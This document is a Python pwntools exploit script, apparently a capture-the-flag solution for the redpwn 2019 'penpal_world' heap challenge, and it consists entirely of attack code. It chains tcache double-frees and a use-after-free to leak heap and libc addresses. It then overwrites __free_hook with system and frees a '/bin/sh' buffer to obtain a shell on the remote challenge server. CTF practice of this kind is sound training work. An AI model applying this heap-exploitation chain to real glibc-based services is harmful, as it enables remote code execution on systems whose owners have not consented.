from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./penpal_world")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./penpal_world")
else:
    p = remote("chall.2019.redpwn.net","4010")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./penpal_world")

def menu(choice):
    p.sendlineafter("4) Read a postcard\n",str(choice))

def add(index):
    menu(1)
    p.sendlineafter("Which envelope #?\n",str(index))

def edit(index,content):
    menu(2)
    p.sendlineafter("Which envelope #?\n",str(index))
    p.sendafter("Write.\n",content)

def free(index):
    menu(3)
    p.sendlineafter("Which envelope #?\n",str(index))

def show(index):
    menu(4)
    p.sendlineafter("Which envelope #?\n",str(index))

code_base = 0x555555554000
def debugf():
    if debug:
        gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xC31)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(0)
add(1)
free(0)
free(1)
show(1)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x260
log.success("heap_base:" + hex(heap_base))
#debugf()
edit(1,p64(heap_base + 0x750))
add(1)
add(1)
edit(1,p64(0) + p64(0x11) + p64(0) + p64(0x11))
add(1)
free(1)
free(1)
edit(1,p64(heap_base + 0x250))
add(1)
add(1)
edit(1,p64(0) + p64(0x501))
debugf()
free(0)
show(0)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
add(0)
free(0)
edit(0,p64(libc.symbols["__free_hook"] - 8))
add(0)
add(0)
edit(0,"/bin/sh\x00" + p64(libc.symbols["system"]))
free(0)
p.interactive()
